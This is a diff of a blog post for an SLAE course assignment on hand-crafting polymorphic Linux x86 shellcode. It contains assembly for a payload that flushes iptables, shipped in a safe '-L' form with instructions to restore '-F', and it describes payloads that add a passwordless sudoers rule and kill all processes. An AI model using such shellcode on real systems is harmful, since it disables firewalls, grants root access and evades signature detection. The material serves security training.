@@ -59,11 +59,11 @@
                       <article id="first-post">
 												<a href="index.html"><img src="../images/michst.jpg" class="avatar" alt="avatar"> </img></a>
                         <h2>&emsp; Creating Polymorphic Shellcode</h2>
-												<h5>&emsp; &emsp; &emsp; &emsp; November 16, 2020</h5>
+												<h5>&emsp; &emsp; &emsp; &emsp; November 15, 2020</h5>
                         <div class="box">
 
 													<br><h2>Contents</h2>
-													<a href="#Kill" style="color:blue;">Kill Process</a><br>
+													<a href="#Kill" style="color:blue;">Kill Processes</a><br>
 													<a href="#Sudoers" style="color:blue;">Add to Sudoers</a><br>
 													<a href="#Iptables" style="color:blue;">Flush Iptables</a><br>
 													<a href="#Thoughts" style="color:blue;">Thoughts and Lessons Learned</a><br><br>
@@ -108,7 +108,7 @@
 
 
 
-			<br><section id="Kill"><h2>Kill Process</h2></section>
+			<br><section id="Kill"><h2>Kill Processes</h2></section>
 
 											<p>
 												The first payload kills all processes using the <a href="https://man7.org/linux/man-pages/man2/kill.2.html" target="_blank" style="color:blue;"><i>kill()</i></a> system call (syscall).
@@ -222,7 +222,7 @@ _start:
 									<p>
 										Since this shellcode is relatively safe, it can be compiled and tested with <i>nasm</i> and <i>ld</i>. &nbsp;Dump the contents of <i>/etc/sudoers</i> before
 										running the compiled payload, and again after executing the payload to confirm <code>ALL ALL=(ALL) NOPASSWD: ALL</code> was indeed written to the file!
-										 &nbsp;Ensure this line is removed afterward with the commands <code>sudo su; visudo -f /etc/sudoers</code>.
+										 &nbsp;Ensure this line is removed afterward with the commands: <code>sudo su; visudo -f /etc/sudoers</code>.
 									</p>
 									<center><div class="image post"><img src="../images/slae/assignment6/7-original-check.png" alt="" /></div></center><br>
 
@@ -244,7 +244,7 @@ _start:
 									</pre>
 
 									<p>
-										Another method is loading <i>eax</i> with the random number instead of pushing it onto the stack. &nbsp;Math can be performed on the register before pushing the its value on the
+										Another method is loading <i>eax</i> with a random number instead of pushing it onto the stack. &nbsp;Math can be performed on the register before pushing the its value on the
 										 stack. &nbsp;Note that this is still an increase of 6 bytes; however, it can be repeated for each DWORD pushed onto the stack. &nbsp;Below is the example.
 									</p>
 									<pre>
@@ -386,7 +386,7 @@ _start:
 	;mov al, 0x04
 	push byte 0x4
 	pop eax				; eax = 4 = syscall write()
-	int 0x80					; syscall
+	int 0x80			; syscall
 
 	;close(file)			; ebx still = file descriptor
 	mov al, 0x06			; eax = close() syscall
@@ -449,61 +449,76 @@ callme:
 										 are subsequently set up for a call to
 										<a href="https://man7.org/linux/man-pages/man2/execve.2.html" target="_blank" style="color:blue;"><i>execve()</i></a>.
 										&nbsp;Based on the above code, arguments are set up like this:<br>
-										 <code>execve(*'/sbin/iptables', *[*'/sbin/iptables', *'-F'], NULL)</code>.
-										&nbsp;
+										 <code>execve(*'/sbin/iptables', *[*'/sbin/iptables', *'-F'], NULL)</code>. &nbsp;If unfamiliar with <i>execve()</i> parameters,
+										 they read like this: a pointer to string <i>'/sbin/iptables'</i>; a pointer to an array of pointers to argument strings
+										 (pointer to string <i>'/sbin/iptables'</i>, and pointer to option string <i>'-F'</i>); the last one is simply NULL.<br>
+										&emsp; &emsp;Due to the danger of flushing iptables, the <i>-F</i> option was changed to <i>-L</i> to allow for safe
+										shellcode testing. &nbsp;The <i>-L</i> option simply lists all rules. &nbsp;To change the option back to <i>-F</i>, use
+										a <a href="https://www.calculator.net/hex-calculator.html" target="_blank" style="color:blue;"><i>hex calculator</i></a> to determine
+										how much to subtract from 0xbe to get 0x46. &nbsp;According to the calculator, this value is 0x78 because 0xbe-0x78 = 0x46 which
+										is 'F' in ascii. &nbsp;Below is the line that needs to be altered; specifically change 0x72 to 0x78.
 									</p>
-									<center><div class="image post"><img src="../images/slae/assignment6/.png" alt="" /></div></center><br>
-
-
-
-
-
-
-
-
-
-
+									<center><div class="image post"><img src="../images/slae/assignment6/12-random-number.png" alt="" /></div></center><br>
 
 									<p>
-										The final <code>iptables -F</code> code is below at a size of 56 opcode bytes:
+										After enough DWORD tweaking and messing with <i>execve()</i> parameters, compile the code with <i>nasm</i> and
+										test with <i>sudo</i>. &nbsp;Functionality works! \o/
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment6/13-compile-and-test.png" alt="" /></div></center><br>
+
+									<p>
+										Dump shellcode using the special
+										<a href="https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump" target="_blank" style="color:blue;">objdump command</a>.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment6/14-dump-iptables.png" alt="" /></div></center><br>
+
+									<p>
+										Copy and paste the shellcode into <i>harness.c</i>.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment6/15-iptables-harness.png" alt="" /></div></center><br>
+
+									<p>
+										Compile the harness once again using the usual gcc command. &nbsp;Run the binary to confirm functionality!
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment6/16-iptables-run.png" alt="" /></div></center><br>
+
+									<p>
+										The final <code>iptables -F</code> code is below at a size of 50 opcode bytes; 8 bytes less than the original size! &nbsp;
+										Although the functionality is identical, there are no garbage instructions inserted. &nbsp;There is still lots of room
+										to place random pushes, pops, and unconditional jumps!
 									</p>
 									<pre>
 										<code class="x86asm" style=display:block;white-space:pre-wrap>
 ; The shellcode flushs the iptables  by running /sbin/iptables -F
+; NOTE: Change sub dword instruction to make '-F'. Testing with -L for safety reasons!!!
 ; original size: 58 bytes
 ; http://shell-storm.org/shellcode/files/shellcode-361.php
 ; Original author: dev0id
 ; Author: John
 
-jmp	short	callme
+jmp	short	callmemaybe
 
 main:
-	pop esi				; esi points to '/sbin/iptables'
+	; Could also place DWORDS onto stack and pop into esi when complete; similar method as in sudoers
+	pop ebx				; esi points to '/sbin/iptables'
 	xor eax,eax			; eax = NULL
 	push eax			; push NULL onto stack
-	push esi			; push pointer to '/sbin/iptables'
-	mov ebx, esp			; ebx points to '/sbin/iptables'
-	push eax			; push NULL onto stack
 	push 0xdeadbeef			; push random value onto stack
-	sub dword [esp], 0xde6791ef 	; '\0-F\0' appears on stack
-	mov edx, esp			; edx points to '\0-F\0'
+	sub dword [esp], 0xdead72c2	; '\0\0-F' appears on stack
+	mov edx, esp			; edx points to '\0\0-F'
+	push eax			; push NULL onto stack
 	push edx			; push -F pointer
 	push ebx			; push '/sbin/iptables' pointer
 	mov ecx, esp 			; ecx points to [*'/sbin/iptables', *'-F']
 	sub edx, edx			; edx = NULL
-	push edx			; push NULL onto stack
-	mov edx, esp			; edx points to NULL
 	mov al, 0x0b			; eax = execve() syscall
 	int 0x80			; syscall
 
-callme:
+callmemaybe:
 	call	main
 	db '/sbin/iptables'
-
-
 										</code>
 									</pre>
-
 
 
 
@@ -512,15 +527,12 @@ callme:
 									<p>
 										&emsp; &emsp;Manually creating polymorphic shellcode is a great exercise in determining how such a process can be automated.
 										 &nbsp; <a href="https://nostarch.com/hacking2.htm" target="_blank" style="color:blue;"><i>Hacking: The Art of Exploitation</i></a>
-										 by Jon Erickson has a fantastic tool on page 369 that randomizes arithmetic towards a target value. &nbsp;In that particular
-										 example, DWORD numbers were generated to make printable characters. &nbsp;The last assignment is creating a custom crypter to
-										 decrypt and execute encrypted payloads.
+										 by Jon Erickson has a fantastic tool called <i>printable_helper</i> on page 369 that randomizes arithmetic towards a target value. &nbsp;In that particular
+										 example, DWORD numbers are generated to make printable characters. &nbsp;It is just one example of a basic polymorphic engine to
+										 randomize shellcode instructions while maintaining its behavior. &nbsp;A follow-on exercise is to create a mathematical randomizer to create
+										 <i>X</i> number of add/sub/push instructions summed together to create specific DWORD strings; much like those in this article. &nbsp;The last assignment
+										  is creating a custom crypter to decrypt and execute encrypted payloads.
 									</p>
-									<center><div class="image post"><img src="../images/slae/assignment6/.png" alt="" /></div></center><br>
-
-
-
-
 
 									<p>
 										The source code for this assignment as well as other SLAE assignments is here:
@@ -533,8 +545,6 @@ callme:
 
 									Student ID: PA-15981
 									</p>
-
-
                         </div>
 
                       </article>
